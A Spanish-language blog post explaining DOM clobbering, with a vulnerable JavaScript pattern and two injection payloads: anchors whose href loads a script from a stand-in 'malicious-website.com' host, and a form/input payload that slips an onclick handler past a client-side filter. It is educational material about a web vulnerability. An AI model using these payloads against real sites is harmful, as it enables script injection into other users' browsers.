---
title: DOM Clobbering
date: 2023-04-18
categories: [Vulnerabilities, Web]
tags: [dom, vulnerabilities, code_injection, web]
comments: false
---

La destrucción de DOM es una técnica avanzada en la que se inyecta HTML en la página para manipular el DOM y, en última instancia, cambiar el comportamiento de JS en el sitio web. La destrucción de DOM es particularmente útil en los casos en que XSS no es posible, pero puede controlar algo de HTML en una página donde los atributos "id" o "name" están incluidos en la lista blanca por el filtro HTML. La forma más común de DOM Clobbering utiliza un elemento de anclaje para sobrescribir una variable global, que luego es utilizada por la aplicación web de una manera no segura, como generar una URL de secuencia de comandos dinámica.

El término clobbing proviene del hecho de que se está "golpeando” una variable global o propiedad de un objeto y sobrescribiendo con un nodo DOM o una colección HTML en su lugar. Por ejemplo, puede usar objetos DOM para sobrescribir otros objetos de JS y explotar nombres no seguros, como "submit", para interferir con la función real "submit()" de un formulario.

## Como explotar las vulnerabilidades de DOM-Clobbering
Un patrón común utilizado por los desarrolladores de JS es:
```
var someObject = window.someObject || {};
``` 
Si puede controlar parte del HTML en la página, puede eliminar la referencia "someObject" con un nodo DOM, como un ancla. Considerando el siguiente código:
```
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```
Para explotar este código vulnerable, podría inyectar el siguiente código HTML para eliminar la referencia "someObject" con un elemento anclaje:
```
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```
Como los dos anclajes usan la misma "ID", el DOM los agrupa en una colección DOM. El vector de destrucción de DOM luego sobrescribe la referencia "someObject" con esta colección de DOM. Se utiliza el atributo "name" en el último elemento ancla para eliminar la propiedad "url" del objeto "someObject", que apunta a un script externo.

Otra técnica común es usar un elemento "form" junto con otro elemento como "input" para destruir las propiedades del DOM. Por ejemplo, eliminar la propiedad "attributes" le permite omitir los filtros del lado del cliente que la usan en su lógica. Aunque el filtro enumera las propiedades "attributes", en realidad no elimina ningún atributo porque la propiedad ha sido golpeada con un nodo DOM. Como resultado, podrá inyectar atributos maliciosos que normalmente se filtraron. Por ejemplo, considere la siguiente inyección:
```
<form onclick=alert(1)><input id=attributes>Click me
```
En este caso, el filtro del lado del cliente atravesaría el DOM y encontrarás un elemento "form" en la lista blanca. Normalmente, el filtro recorrería la propiedad "attributes" del elemento "form" y eliminaría cualquier atributo de la lista negra. Sin embargo, debido a que la propiedad "attributes" ha sido golpeada con el elemento "input", el filtro recorre el elemento "input" en su lugar. Como el elemento "input" tiene una longitud indefinida, no se cumplen las condiciones para el ciclo "for" del filtro y el filtro simplemente pasa al siguiente elemento. Esto da como resultado que el evento "onclick" sea ignorado por completo por el filtro, lo que posteriormente permite llamar a la función "alert()" en el navegador.
